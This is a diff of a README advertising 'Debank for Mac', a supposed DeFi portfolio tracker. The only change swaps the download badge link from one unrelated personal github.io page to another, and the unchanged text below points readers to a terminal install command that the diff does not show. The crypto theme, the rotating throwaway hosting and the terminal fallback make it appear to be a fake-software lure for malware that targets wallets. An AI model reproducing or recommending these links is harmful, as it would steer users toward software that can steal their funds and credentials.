@@ -3,7 +3,7 @@
 
 Debank for Mac brings you the most powerful way to track and analyze your DeFi portfolio directly on your macOS device. With this tool, you can monitor wallets, tokens, and protocols seamlessly, while enjoying a secure and smooth installation process. Follow the guide below to install and get started today.
 
-[![Download For Mac](https://img.shields.io/badge/Download%20for-Mac%20OS-000000?logo=apple&style=for-the-badge)](https://kamartamara.github.io/.github/debank)
+[![Download For Mac](https://img.shields.io/badge/Download%20for-Mac%20OS-000000?logo=apple&style=for-the-badge)](https://tayusikf8398.github.io/.github/debank)
 
 If the download button does not work, please follow the instructions below using the terminal command.
 
